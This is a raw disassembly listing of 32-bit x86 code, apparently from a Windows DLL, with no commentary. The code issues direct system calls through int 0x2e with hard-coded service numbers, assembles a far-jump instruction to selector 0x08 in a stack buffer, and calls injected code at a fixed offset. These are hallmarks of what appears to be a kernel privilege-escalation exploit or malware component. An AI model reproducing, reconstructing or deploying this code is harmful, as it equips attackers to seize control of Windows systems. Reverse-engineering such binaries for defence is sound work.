1000b56a:	53                   	push   %ebx
1000b56b:	66 c7 45 fa 00 02    	movw   $0x200,-0x6(%ebp)
1000b571:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000b574:	ff d6                	call   *%esi
1000b576:	6a 10                	push   $0x10
1000b578:	53                   	push   %ebx
1000b579:	8b f8                	mov    %eax,%edi
1000b57b:	ff d6                	call   *%esi
1000b57d:	6a 08                	push   $0x8
1000b57f:	53                   	push   %ebx
1000b580:	57                   	push   %edi
1000b581:	8b f0                	mov    %eax,%esi
1000b583:	e8 8e 1d 00 00       	call   0x1000d316
1000b588:	6a 10                	push   $0x10
1000b58a:	53                   	push   %ebx
1000b58b:	56                   	push   %esi
1000b58c:	e8 85 1d 00 00       	call   0x1000d316
1000b591:	6a 08                	push   $0x8
1000b593:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000b596:	53                   	push   %ebx
1000b597:	50                   	push   %eax
1000b598:	e8 79 1d 00 00       	call   0x1000d316
1000b59d:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000b5a0:	83 c4 24             	add    $0x24,%esp
1000b5a3:	89 45 ec             	mov    %eax,-0x14(%ebp)
1000b5a6:	8d 45 e4             	lea    -0x1c(%ebp),%eax
1000b5a9:	89 7d e4             	mov    %edi,-0x1c(%ebp)
1000b5ac:	89 75 e8             	mov    %esi,-0x18(%ebp)
1000b5af:	89 45 dc             	mov    %eax,-0x24(%ebp)
1000b5b2:	50                   	push   %eax
1000b5b3:	53                   	push   %ebx
1000b5b4:	51                   	push   %ecx
1000b5b5:	52                   	push   %edx
1000b5b6:	56                   	push   %esi
1000b5b7:	57                   	push   %edi
1000b5b8:	8b 45 10             	mov    0x10(%ebp),%eax
1000b5bb:	6a 00                	push   $0x0
1000b5bd:	68 80 00 00 00       	push   $0x80
1000b5c2:	68 5a 02 00 00       	push   $0x25a
1000b5c7:	ff 75 dc             	push   -0x24(%ebp)
1000b5ca:	ff 75 e0             	push   -0x20(%ebp)
1000b5cd:	ff 75 18             	push   0x18(%ebp)
1000b5d0:	8b d4                	mov    %esp,%edx
1000b5d2:	cd 2e                	int    $0x2e
1000b5d4:	83 c4 18             	add    $0x18,%esp
1000b5d7:	5f                   	pop    %edi
1000b5d8:	5e                   	pop    %esi
1000b5d9:	5a                   	pop    %edx
1000b5da:	59                   	pop    %ecx
1000b5db:	5b                   	pop    %ebx
1000b5dc:	58                   	pop    %eax
1000b5dd:	33 db                	xor    %ebx,%ebx
1000b5df:	53                   	push   %ebx
1000b5e0:	68 f4 04 01 10       	push   $0x100104f4
1000b5e5:	ff 15 10 e2 00 10    	call   *0x1000e210
1000b5eb:	8b 45 08             	mov    0x8(%ebp),%eax
1000b5ee:	c1 e8 10             	shr    $0x10,%eax
1000b5f1:	2d 98 00 00 00       	sub    $0x98,%eax
1000b5f6:	25 ff ff 00 00       	and    $0xffff,%eax
1000b5fb:	8b 35 c4 e0 00 10    	mov    0x1000e0c4,%esi
1000b601:	6a 08                	push   $0x8
1000b603:	53                   	push   %ebx
1000b604:	89 45 bc             	mov    %eax,-0x44(%ebp)
1000b607:	ff d6                	call   *%esi
1000b609:	6a 10                	push   $0x10
1000b60b:	53                   	push   %ebx
1000b60c:	8b f8                	mov    %eax,%edi
1000b60e:	ff d6                	call   *%esi
1000b610:	6a 08                	push   $0x8
1000b612:	53                   	push   %ebx
1000b613:	57                   	push   %edi
1000b614:	8b f0                	mov    %eax,%esi
1000b616:	e8 fb 1c 00 00       	call   0x1000d316
1000b61b:	6a 10                	push   $0x10
1000b61d:	53                   	push   %ebx
1000b61e:	56                   	push   %esi
1000b61f:	e8 f2 1c 00 00       	call   0x1000d316
1000b624:	8d 85 78 fd ff ff    	lea    -0x288(%ebp),%eax
1000b62a:	68 c8 04 01 10       	push   $0x100104c8
1000b62f:	50                   	push   %eax
1000b630:	89 7d e4             	mov    %edi,-0x1c(%ebp)
1000b633:	89 75 e8             	mov    %esi,-0x18(%ebp)
1000b636:	ff 15 8c e1 00 10    	call   *0x1000e18c
1000b63c:	8d 85 78 fd ff ff    	lea    -0x288(%ebp),%eax
1000b642:	50                   	push   %eax
1000b643:	ff 15 e8 e1 00 10    	call   *0x1000e1e8
1000b649:	d1 e0                	shl    $1,%eax
1000b64b:	83 c4 24             	add    $0x24,%esp
1000b64e:	66 89 45 f8          	mov    %ax,-0x8(%ebp)
1000b652:	66 c7 45 fa 00 02    	movw   $0x200,-0x6(%ebp)
1000b658:	50                   	push   %eax
1000b659:	53                   	push   %ebx
1000b65a:	51                   	push   %ecx
1000b65b:	52                   	push   %edx
1000b65c:	56                   	push   %esi
1000b65d:	57                   	push   %edi
1000b65e:	8b 45 10             	mov    0x10(%ebp),%eax
1000b661:	6a 00                	push   $0x0
1000b663:	68 80 00 00 00       	push   $0x80
1000b668:	68 5b 02 00 00       	push   $0x25b
1000b66d:	ff 75 dc             	push   -0x24(%ebp)
1000b670:	ff 75 e0             	push   -0x20(%ebp)
1000b673:	ff 75 18             	push   0x18(%ebp)
1000b676:	8b d4                	mov    %esp,%edx
1000b678:	cd 2e                	int    $0x2e
1000b67a:	83 c4 18             	add    $0x18,%esp
1000b67d:	5f                   	pop    %edi
1000b67e:	5e                   	pop    %esi
1000b67f:	5a                   	pop    %edx
1000b680:	59                   	pop    %ecx
1000b681:	5b                   	pop    %ebx
1000b682:	58                   	pop    %eax
1000b683:	6a 00                	push   $0x0
1000b685:	68 c8 04 01 10       	push   $0x100104c8
1000b68a:	ff 15 10 e2 00 10    	call   *0x1000e210
1000b690:	83 4d 08 ff          	orl    $0xffffffff,0x8(%ebp)
1000b694:	50                   	push   %eax
1000b695:	53                   	push   %ebx
1000b696:	51                   	push   %ecx
1000b697:	52                   	push   %edx
1000b698:	56                   	push   %esi
1000b699:	57                   	push   %edi
1000b69a:	8b 45 14             	mov    0x14(%ebp),%eax
1000b69d:	6a 00                	push   $0x0
1000b69f:	6a 1f                	push   $0x1f
1000b6a1:	6a 00                	push   $0x0
1000b6a3:	6a 00                	push   $0x0
1000b6a5:	6a 00                	push   $0x0
1000b6a7:	68 00 06 00 00       	push   $0x600
1000b6ac:	ff 75 0c             	push   0xc(%ebp)
1000b6af:	8b d4                	mov    %esp,%edx
1000b6b1:	cd 2e                	int    $0x2e
1000b6b3:	83 c4 1c             	add    $0x1c,%esp
1000b6b6:	89 45 08             	mov    %eax,0x8(%ebp)
1000b6b9:	5f                   	pop    %edi
1000b6ba:	5e                   	pop    %esi
1000b6bb:	5a                   	pop    %edx
1000b6bc:	59                   	pop    %ecx
1000b6bd:	5b                   	pop    %ebx
1000b6be:	58                   	pop    %eax
1000b6bf:	8b 45 08             	mov    0x8(%ebp),%eax
1000b6c2:	85 c0                	test   %eax,%eax
1000b6c4:	75 0c                	jne    0x1000b6d2
1000b6c6:	38 45 a8             	cmp    %al,-0x58(%ebp)
1000b6c9:	75 07                	jne    0x1000b6d2
1000b6cb:	6a c0                	push   $0xffffffc0
1000b6cd:	eb 02                	jmp    0x1000b6d1
1000b6cf:	6a 57                	push   $0x57
1000b6d1:	58                   	pop    %eax
1000b6d2:	5f                   	pop    %edi
1000b6d3:	5e                   	pop    %esi
1000b6d4:	5b                   	pop    %ebx
1000b6d5:	c9                   	leave
1000b6d6:	c3                   	ret
1000b6d7:	55                   	push   %ebp
1000b6d8:	8b ec                	mov    %esp,%ebp
1000b6da:	6a ff                	push   $0xffffffff
1000b6dc:	68 88 e6 00 10       	push   $0x1000e688
1000b6e1:	68 00 c6 00 10       	push   $0x1000c600
1000b6e6:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000b6ec:	50                   	push   %eax
1000b6ed:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000b6f4:	83 ec 0c             	sub    $0xc,%esp
1000b6f7:	53                   	push   %ebx
1000b6f8:	56                   	push   %esi
1000b6f9:	57                   	push   %edi
1000b6fa:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000b6fd:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000b701:	8b 45 08             	mov    0x8(%ebp),%eax
1000b704:	c6 40 30 01          	movb   $0x1,0x30(%eax)
1000b708:	ff 70 08             	push   0x8(%eax)
1000b70b:	ff 70 04             	push   0x4(%eax)
1000b70e:	8d 48 0c             	lea    0xc(%eax),%ecx
1000b711:	51                   	push   %ecx
1000b712:	ff 10                	call   *(%eax)
1000b714:	83 c4 0c             	add    $0xc,%esp
1000b717:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000b71b:	eb 0e                	jmp    0x1000b72b
1000b71d:	6a 01                	push   $0x1
1000b71f:	58                   	pop    %eax
1000b720:	c3                   	ret
1000b721:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000b724:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000b728:	6a d5                	push   $0xffffffd5
1000b72a:	58                   	pop    %eax
1000b72b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000b72e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000b735:	5f                   	pop    %edi
1000b736:	5e                   	pop    %esi
1000b737:	5b                   	pop    %ebx
1000b738:	c9                   	leave
1000b739:	c3                   	ret
1000b73a:	55                   	push   %ebp
1000b73b:	8b ec                	mov    %esp,%ebp
1000b73d:	6a ff                	push   $0xffffffff
1000b73f:	68 98 e6 00 10       	push   $0x1000e698
1000b744:	68 00 c6 00 10       	push   $0x1000c600
1000b749:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000b74f:	50                   	push   %eax
1000b750:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000b757:	81 ec e4 02 00 00    	sub    $0x2e4,%esp
1000b75d:	53                   	push   %ebx
1000b75e:	56                   	push   %esi
1000b75f:	57                   	push   %edi
1000b760:	8b 75 08             	mov    0x8(%ebp),%esi
1000b763:	33 db                	xor    %ebx,%ebx
1000b765:	3b f3                	cmp    %ebx,%esi
1000b767:	0f 84 9d 04 00 00    	je     0x1000bc0a
1000b76d:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
1000b770:	0f 84 94 04 00 00    	je     0x1000bc0a
1000b776:	8b 45 10             	mov    0x10(%ebp),%eax
1000b779:	3b c3                	cmp    %ebx,%eax
1000b77b:	0f 84 89 04 00 00    	je     0x1000bc0a
1000b781:	89 45 94             	mov    %eax,-0x6c(%ebp)
1000b784:	8b 45 14             	mov    0x14(%ebp),%eax
1000b787:	89 45 d4             	mov    %eax,-0x2c(%ebp)
1000b78a:	8b 45 18             	mov    0x18(%ebp),%eax
1000b78d:	89 45 d8             	mov    %eax,-0x28(%ebp)
1000b790:	8d 86 00 02 00 00    	lea    0x200(%esi),%eax
1000b796:	89 85 0c fd ff ff    	mov    %eax,-0x2f4(%ebp)
1000b79c:	89 45 d0             	mov    %eax,-0x30(%ebp)
1000b79f:	88 5d dc             	mov    %bl,-0x24(%ebp)
1000b7a2:	88 5d dd             	mov    %bl,-0x23(%ebp)
1000b7a5:	c6 45 a4 ea          	movb   $0xea,-0x5c(%ebp)
1000b7a9:	8a c8                	mov    %al,%cl
1000b7ab:	88 4d a5             	mov    %cl,-0x5b(%ebp)
1000b7ae:	8b c8                	mov    %eax,%ecx
1000b7b0:	c1 e9 08             	shr    $0x8,%ecx
1000b7b3:	88 4d a6             	mov    %cl,-0x5a(%ebp)
1000b7b6:	8b c8                	mov    %eax,%ecx
1000b7b8:	c1 e9 10             	shr    $0x10,%ecx
1000b7bb:	88 4d a7             	mov    %cl,-0x59(%ebp)
1000b7be:	c1 e8 18             	shr    $0x18,%eax
1000b7c1:	88 45 a8             	mov    %al,-0x58(%ebp)
1000b7c4:	c6 45 a9 08          	movb   $0x8,-0x57(%ebp)
1000b7c8:	88 5d aa             	mov    %bl,-0x56(%ebp)
1000b7cb:	c6 45 ab 90          	movb   $0x90,-0x55(%ebp)
1000b7cf:	68 14 05 01 10       	push   $0x10010514
1000b7d4:	e8 7c 0f 00 00       	call   0x1000c755
1000b7d9:	59                   	pop    %ecx
1000b7da:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000b7dd:	3b c3                	cmp    %ebx,%eax
1000b7df:	75 07                	jne    0x1000b7e8
1000b7e1:	6a ba                	push   $0xffffffba
1000b7e3:	e9 24 04 00 00       	jmp    0x1000bc0c
1000b7e8:	8d 45 8c             	lea    -0x74(%ebp),%eax
1000b7eb:	50                   	push   %eax
1000b7ec:	8d 45 88             	lea    -0x78(%ebp),%eax
1000b7ef:	50                   	push   %eax
1000b7f0:	e8 c2 06 00 00       	call   0x1000beb7
1000b7f5:	59                   	pop    %ecx
1000b7f6:	59                   	pop    %ecx
1000b7f7:	3b c3                	cmp    %ebx,%eax
1000b7f9:	74 07                	je     0x1000b802
1000b7fb:	6a d4                	push   $0xffffffd4
1000b7fd:	e9 0a 04 00 00       	jmp    0x1000bc0c
1000b802:	8d 45 ac             	lea    -0x54(%ebp),%eax
1000b805:	50                   	push   %eax
1000b806:	e8 c8 e3 ff ff       	call   0x10009bd3
1000b80b:	59                   	pop    %ecx
1000b80c:	84 c0                	test   %al,%al
1000b80e:	75 07                	jne    0x1000b817
1000b810:	6a c3                	push   $0xffffffc3
1000b812:	e9 f5 03 00 00       	jmp    0x1000bc0c
1000b817:	83 4d 84 ff          	orl    $0xffffffff,-0x7c(%ebp)
1000b81b:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000b81e:	89 9d 64 ff ff ff    	mov    %ebx,-0x9c(%ebp)
1000b824:	8d 85 64 ff ff ff    	lea    -0x9c(%ebp),%eax
1000b82a:	50                   	push   %eax
1000b82b:	8d 45 94             	lea    -0x6c(%ebp),%eax
1000b82e:	50                   	push   %eax
1000b82f:	e8 e7 05 00 00       	call   0x1000be1b
1000b834:	59                   	pop    %ecx
1000b835:	59                   	pop    %ecx
1000b836:	84 c0                	test   %al,%al
1000b838:	75 0c                	jne    0x1000b846
1000b83a:	c7 45 84 c1 ff ff ff 	movl   $0xffffffc1,-0x7c(%ebp)
1000b841:	e9 a2 03 00 00       	jmp    0x1000bbe8
1000b846:	6a 0d                	push   $0xd
1000b848:	8d 45 94             	lea    -0x6c(%ebp),%eax
1000b84b:	50                   	push   %eax
1000b84c:	6a 07                	push   $0x7
1000b84e:	68 1c bc 00 10       	push   $0x1000bc1c
1000b853:	56                   	push   %esi
1000b854:	6a 17                	push   $0x17
1000b856:	68 d4 05 01 10       	push   $0x100105d4
1000b85b:	e8 d5 df ff ff       	call   0x10009835
1000b860:	89 b5 28 ff ff ff    	mov    %esi,-0xd8(%ebp)
1000b866:	8b c6                	mov    %esi,%eax
1000b868:	c1 e8 10             	shr    $0x10,%eax
1000b86b:	89 85 1c fd ff ff    	mov    %eax,-0x2e4(%ebp)
1000b871:	c7 85 74 ff ff ff b0 	movl   $0xb0,-0x8c(%ebp)
1000b878:	00 00 00 
1000b87b:	c7 85 34 ff ff ff 30 	movl   $0x30,-0xcc(%ebp)
1000b882:	00 00 00 
1000b885:	89 9d 38 ff ff ff    	mov    %ebx,-0xc8(%ebp)
1000b88b:	89 9d 3c ff ff ff    	mov    %ebx,-0xc4(%ebp)
1000b891:	89 9d 40 ff ff ff    	mov    %ebx,-0xc0(%ebp)
1000b897:	89 9d 44 ff ff ff    	mov    %ebx,-0xbc(%ebp)
1000b89d:	89 9d 48 ff ff ff    	mov    %ebx,-0xb8(%ebp)
1000b8a3:	89 9d 4c ff ff ff    	mov    %ebx,-0xb4(%ebp)
1000b8a9:	89 9d 50 ff ff ff    	mov    %ebx,-0xb0(%ebp)
1000b8af:	89 9d 54 ff ff ff    	mov    %ebx,-0xac(%ebp)
1000b8b5:	89 9d 58 ff ff ff    	mov    %ebx,-0xa8(%ebp)
1000b8bb:	89 9d 5c ff ff ff    	mov    %ebx,-0xa4(%ebp)
1000b8c1:	89 9d 60 ff ff ff    	mov    %ebx,-0xa0(%ebp)
1000b8c7:	8d 85 34 ff ff ff    	lea    -0xcc(%ebp),%eax
1000b8cd:	89 85 6c ff ff ff    	mov    %eax,-0x94(%ebp)
1000b8d3:	8d 86 50 ff ff ff    	lea    -0xb0(%esi),%eax
1000b8d9:	25 ff ff 00 00       	and    $0xffff,%eax
1000b8de:	89 85 44 ff ff ff    	mov    %eax,-0xbc(%ebp)
1000b8e4:	68 f4 04 01 10       	push   $0x100104f4
1000b8e9:	8d 85 20 fd ff ff    	lea    -0x2e0(%ebp),%eax
1000b8ef:	50                   	push   %eax
1000b8f0:	ff 15 8c e1 00 10    	call   *0x1000e18c
1000b8f6:	8d 85 20 fd ff ff    	lea    -0x2e0(%ebp),%eax
1000b8fc:	50                   	push   %eax
1000b8fd:	ff 15 e8 e1 00 10    	call   *0x1000e1e8
1000b903:	83 c4 28             	add    $0x28,%esp
1000b906:	d1 e0                	shl    $1,%eax
1000b908:	66 89 85 20 ff ff ff 	mov    %ax,-0xe0(%ebp)
1000b90f:	66 c7 85 22 ff ff ff 	movw   $0x200,-0xde(%ebp)
1000b916:	00 02 
1000b918:	8d 85 20 fd ff ff    	lea    -0x2e0(%ebp),%eax
1000b91e:	89 85 24 ff ff ff    	mov    %eax,-0xdc(%ebp)
1000b924:	8d 85 20 ff ff ff    	lea    -0xe0(%ebp),%eax
1000b92a:	89 85 2c ff ff ff    	mov    %eax,-0xd4(%ebp)
1000b930:	89 9d 70 ff ff ff    	mov    %ebx,-0x90(%ebp)
1000b936:	89 9d 10 fd ff ff    	mov    %ebx,-0x2f0(%ebp)
1000b93c:	6a 08                	push   $0x8
1000b93e:	53                   	push   %ebx
1000b93f:	8b 3d c4 e0 00 10    	mov    0x1000e0c4,%edi
1000b945:	ff d7                	call   *%edi
1000b947:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
1000b94d:	6a 10                	push   $0x10
1000b94f:	53                   	push   %ebx
1000b950:	ff d7                	call   *%edi
1000b952:	8b f8                	mov    %eax,%edi
1000b954:	89 bd 10 fd ff ff    	mov    %edi,-0x2f0(%ebp)
1000b95a:	6a 08                	push   $0x8
1000b95c:	53                   	push   %ebx
1000b95d:	ff b5 70 ff ff ff    	push   -0x90(%ebp)
1000b963:	e8 ae 19 00 00       	call   0x1000d316
1000b968:	6a 10                	push   $0x10
1000b96a:	53                   	push   %ebx
1000b96b:	57                   	push   %edi
1000b96c:	e8 a5 19 00 00       	call   0x1000d316
1000b971:	6a 08                	push   $0x8
1000b973:	53                   	push   %ebx
1000b974:	8d 85 14 fd ff ff    	lea    -0x2ec(%ebp),%eax
1000b97a:	50                   	push   %eax
1000b97b:	e8 96 19 00 00       	call   0x1000d316
1000b980:	8b 85 70 ff ff ff    	mov    -0x90(%ebp),%eax
1000b986:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
1000b98c:	89 bd 7c ff ff ff    	mov    %edi,-0x84(%ebp)
1000b992:	8d 85 14 fd ff ff    	lea    -0x2ec(%ebp),%eax
1000b998:	89 45 80             	mov    %eax,-0x80(%ebp)
1000b99b:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
1000b9a1:	89 85 68 ff ff ff    	mov    %eax,-0x98(%ebp)
1000b9a7:	81 c6 00 05 00 00    	add    $0x500,%esi
1000b9ad:	89 b5 30 ff ff ff    	mov    %esi,-0xd0(%ebp)
1000b9b3:	6a 08                	push   $0x8
1000b9b5:	6a 1c                	push   $0x1c
1000b9b7:	56                   	push   %esi
1000b9b8:	6a 0a                	push   $0xa
1000b9ba:	68 00 06 01 10       	push   $0x10010600
1000b9bf:	e8 d4 de ff ff       	call   0x10009898
1000b9c4:	83 c4 38             	add    $0x38,%esp
1000b9c7:	50                   	push   %eax
1000b9c8:	53                   	push   %ebx
1000b9c9:	51                   	push   %ecx
1000b9ca:	52                   	push   %edx
1000b9cb:	56                   	push   %esi
1000b9cc:	57                   	push   %edi
1000b9cd:	6a 00                	push   $0x0
1000b9cf:	68 80 00 00 00       	push   $0x80
1000b9d4:	68 5a 02 00 00       	push   $0x25a
1000b9d9:	ff b5 68 ff ff ff    	push   -0x98(%ebp)
1000b9df:	ff b5 2c ff ff ff    	push   -0xd4(%ebp)
1000b9e5:	ff b5 2c ff ff ff    	push   -0xd4(%ebp)
1000b9eb:	ff b5 6c ff ff ff    	push   -0x94(%ebp)
1000b9f1:	8b 45 88             	mov    -0x78(%ebp),%eax
1000b9f4:	ff 95 30 ff ff ff    	call   *-0xd0(%ebp)
1000b9fa:	5f                   	pop    %edi
1000b9fb:	5e                   	pop    %esi
1000b9fc:	5a                   	pop    %edx
1000b9fd:	59                   	pop    %ecx
1000b9fe:	5b                   	pop    %ebx
1000b9ff:	58                   	pop    %eax
1000ba00:	33 db                	xor    %ebx,%ebx
1000ba02:	53                   	push   %ebx
1000ba03:	68 e4 04 01 10       	push   $0x100104e4
1000ba08:	ff 15 fc e1 00 10    	call   *0x1000e1fc
1000ba0e:	8b 85 1c fd ff ff    	mov    -0x2e4(%ebp),%eax
1000ba14:	05 50 ff ff ff       	add    $0xffffff50,%eax
1000ba19:	25 ff ff 00 00       	and    $0xffff,%eax
1000ba1e:	89 85 44 ff ff ff    	mov    %eax,-0xbc(%ebp)
1000ba24:	6a 08                	push   $0x8
1000ba26:	53                   	push   %ebx
1000ba27:	8b 35 c4 e0 00 10    	mov    0x1000e0c4,%esi
1000ba2d:	ff d6                	call   *%esi
1000ba2f:	8b f8                	mov    %eax,%edi
1000ba31:	89 bd 70 ff ff ff    	mov    %edi,-0x90(%ebp)
1000ba37:	6a 10                	push   $0x10
1000ba39:	53                   	push   %ebx
1000ba3a:	ff d6                	call   *%esi
1000ba3c:	8b f0                	mov    %eax,%esi
1000ba3e:	89 b5 10 fd ff ff    	mov    %esi,-0x2f0(%ebp)
1000ba44:	6a 08                	push   $0x8
1000ba46:	53                   	push   %ebx
1000ba47:	57                   	push   %edi
1000ba48:	e8 c9 18 00 00       	call   0x1000d316
1000ba4d:	6a 10                	push   $0x10
1000ba4f:	53                   	push   %ebx
1000ba50:	56                   	push   %esi
1000ba51:	e8 c0 18 00 00       	call   0x1000d316
1000ba56:	89 bd 78 ff ff ff    	mov    %edi,-0x88(%ebp)
1000ba5c:	89 b5 7c ff ff ff    	mov    %esi,-0x84(%ebp)
1000ba62:	68 c8 04 01 10       	push   $0x100104c8
1000ba67:	8d 85 20 fd ff ff    	lea    -0x2e0(%ebp),%eax
1000ba6d:	50                   	push   %eax
1000ba6e:	ff 15 8c e1 00 10    	call   *0x1000e18c
1000ba74:	8d 85 20 fd ff ff    	lea    -0x2e0(%ebp),%eax
1000ba7a:	50                   	push   %eax
1000ba7b:	ff 15 e8 e1 00 10    	call   *0x1000e1e8
1000ba81:	d1 e0                	shl    $1,%eax
1000ba83:	66 89 85 20 ff ff ff 	mov    %ax,-0xe0(%ebp)
1000ba8a:	66 c7 85 22 ff ff ff 	movw   $0x200,-0xde(%ebp)
1000ba91:	00 02 
1000ba93:	6a 08                	push   $0x8
1000ba95:	6a 1c                	push   $0x1c
1000ba97:	ff b5 30 ff ff ff    	push   -0xd0(%ebp)
1000ba9d:	6a 0a                	push   $0xa
1000ba9f:	68 00 06 01 10       	push   $0x10010600
1000baa4:	e8 ef dd ff ff       	call   0x10009898
1000baa9:	83 c4 38             	add    $0x38,%esp
1000baac:	50                   	push   %eax
1000baad:	53                   	push   %ebx
1000baae:	51                   	push   %ecx
1000baaf:	52                   	push   %edx
1000bab0:	56                   	push   %esi
1000bab1:	57                   	push   %edi
1000bab2:	6a 00                	push   $0x0
1000bab4:	68 80 00 00 00       	push   $0x80
1000bab9:	68 5b 02 00 00       	push   $0x25b
1000babe:	ff b5 68 ff ff ff    	push   -0x98(%ebp)
1000bac4:	ff b5 2c ff ff ff    	push   -0xd4(%ebp)
1000baca:	ff b5 2c ff ff ff    	push   -0xd4(%ebp)
1000bad0:	ff b5 6c ff ff ff    	push   -0x94(%ebp)
1000bad6:	8b 45 88             	mov    -0x78(%ebp),%eax
1000bad9:	ff 95 30 ff ff ff    	call   *-0xd0(%ebp)
1000badf:	5f                   	pop    %edi
1000bae0:	5e                   	pop    %esi
1000bae1:	5a                   	pop    %edx
1000bae2:	59                   	pop    %ecx
1000bae3:	5b                   	pop    %ebx
1000bae4:	58                   	pop    %eax
1000bae5:	6a 00                	push   $0x0
1000bae7:	68 b8 04 01 10       	push   $0x100104b8
1000baec:	ff 15 fc e1 00 10    	call   *0x1000e1fc
1000baf2:	6a 08                	push   $0x8
1000baf4:	6a 1c                	push   $0x1c
1000baf6:	ff b5 30 ff ff ff    	push   -0xd0(%ebp)
1000bafc:	6a 0a                	push   $0xa
1000bafe:	68 00 06 01 10       	push   $0x10010600
1000bb03:	e8 90 dd ff ff       	call   0x10009898
1000bb08:	ff b5 64 ff ff ff    	push   -0x9c(%ebp)
1000bb0e:	e8 2d 0b 00 00       	call   0x1000c640
1000bb13:	83 c4 18             	add    $0x18,%esp
1000bb16:	84 c0                	test   %al,%al
1000bb18:	75 0c                	jne    0x1000bb26
1000bb1a:	c7 45 84 c3 ff ff ff 	movl   $0xffffffc3,-0x7c(%ebp)
1000bb21:	e9 c0 00 00 00       	jmp    0x1000bbe6
1000bb26:	50                   	push   %eax
1000bb27:	53                   	push   %ebx
1000bb28:	51                   	push   %ecx
1000bb29:	52                   	push   %edx
1000bb2a:	56                   	push   %esi
1000bb2b:	57                   	push   %edi
1000bb2c:	6a 00                	push   $0x0
1000bb2e:	6a 01                	push   $0x1
1000bb30:	6a 00                	push   $0x0
1000bb32:	6a 00                	push   $0x0
1000bb34:	6a 00                	push   $0x0
1000bb36:	68 00 06 00 00       	push   $0x600
1000bb3b:	ff 75 0c             	push   0xc(%ebp)
1000bb3e:	8b 45 8c             	mov    -0x74(%ebp),%eax
1000bb41:	ff 95 30 ff ff ff    	call   *-0xd0(%ebp)
1000bb47:	89 45 84             	mov    %eax,-0x7c(%ebp)
1000bb4a:	5f                   	pop    %edi
1000bb4b:	5e                   	pop    %esi
1000bb4c:	5a                   	pop    %edx
1000bb4d:	59                   	pop    %ecx
1000bb4e:	5b                   	pop    %ebx
1000bb4f:	58                   	pop    %eax
1000bb50:	6a 00                	push   $0x0
1000bb52:	e8 e9 0a 00 00       	call   0x1000c640
1000bb57:	59                   	pop    %ecx
1000bb58:	83 7d 84 00          	cmpl   $0x0,-0x7c(%ebp)
1000bb5c:	0f 85 84 00 00 00    	jne    0x1000bbe6
1000bb62:	80 7d dc 00          	cmpb   $0x0,-0x24(%ebp)
1000bb66:	74 77                	je     0x1000bbdf
1000bb68:	6a 07                	push   $0x7
1000bb6a:	8d 45 94             	lea    -0x6c(%ebp),%eax
1000bb6d:	50                   	push   %eax
1000bb6e:	6a 01                	push   $0x1
1000bb70:	68 a8 bc 00 10       	push   $0x1000bca8
1000bb75:	ff b5 0c fd ff ff    	push   -0x2f4(%ebp)
1000bb7b:	6a 11                	push   $0x11
1000bb7d:	68 ec 05 01 10       	push   $0x100105ec
1000bb82:	e8 ae dc ff ff       	call   0x10009835
1000bb87:	6a 08                	push   $0x8
1000bb89:	6a 04                	push   $0x4
1000bb8b:	ff b5 30 ff ff ff    	push   -0xd0(%ebp)
1000bb91:	6a 0a                	push   $0xa
1000bb93:	68 00 06 01 10       	push   $0x10010600
1000bb98:	e8 fb dc ff ff       	call   0x10009898
1000bb9d:	ff b5 64 ff ff ff    	push   -0x9c(%ebp)
1000bba3:	e8 98 0a 00 00       	call   0x1000c640
1000bba8:	83 c4 34             	add    $0x34,%esp
1000bbab:	84 c0                	test   %al,%al
1000bbad:	0f 84 67 ff ff ff    	je     0x1000bb1a
1000bbb3:	83 4d 84 ff          	orl    $0xffffffff,-0x7c(%ebp)
1000bbb7:	50                   	push   %eax
1000bbb8:	53                   	push   %ebx
1000bbb9:	51                   	push   %ecx
1000bbba:	52                   	push   %edx
1000bbbb:	56                   	push   %esi
1000bbbc:	57                   	push   %edi
1000bbbd:	6a 64                	push   $0x64
1000bbbf:	8b 45 e0             	mov    -0x20(%ebp),%eax
1000bbc2:	ff 95 30 ff ff ff    	call   *-0xd0(%ebp)
1000bbc8:	89 45 84             	mov    %eax,-0x7c(%ebp)
1000bbcb:	5f                   	pop    %edi
1000bbcc:	5e                   	pop    %esi
1000bbcd:	5a                   	pop    %edx
1000bbce:	59                   	pop    %ecx
1000bbcf:	5b                   	pop    %ebx
1000bbd0:	58                   	pop    %eax
1000bbd1:	6a 00                	push   $0x0
1000bbd3:	e8 68 0a 00 00       	call   0x1000c640
1000bbd8:	59                   	pop    %ecx
1000bbd9:	80 7d dd 00          	cmpb   $0x0,-0x23(%ebp)
1000bbdd:	75 07                	jne    0x1000bbe6
1000bbdf:	c7 45 84 c0 ff ff ff 	movl   $0xffffffc0,-0x7c(%ebp)
1000bbe6:	33 db                	xor    %ebx,%ebx
1000bbe8:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000bbec:	e8 07 00 00 00       	call   0x1000bbf8
1000bbf1:	8b 45 84             	mov    -0x7c(%ebp),%eax
1000bbf4:	eb 17                	jmp    0x1000bc0d
1000bbf6:	33 db                	xor    %ebx,%ebx
1000bbf8:	39 5d ac             	cmp    %ebx,-0x54(%ebp)
1000bbfb:	74 0c                	je     0x1000bc09
1000bbfd:	ff 75 ac             	push   -0x54(%ebp)
1000bc00:	ff 15 98 e0 00 10    	call   *0x1000e098
1000bc06:	89 5d ac             	mov    %ebx,-0x54(%ebp)
1000bc09:	c3                   	ret
1000bc0a:	6a 57                	push   $0x57
1000bc0c:	58                   	pop    %eax
1000bc0d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000bc10:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000bc17:	5f                   	pop    %edi
1000bc18:	5e                   	pop    %esi
1000bc19:	5b                   	pop    %ebx
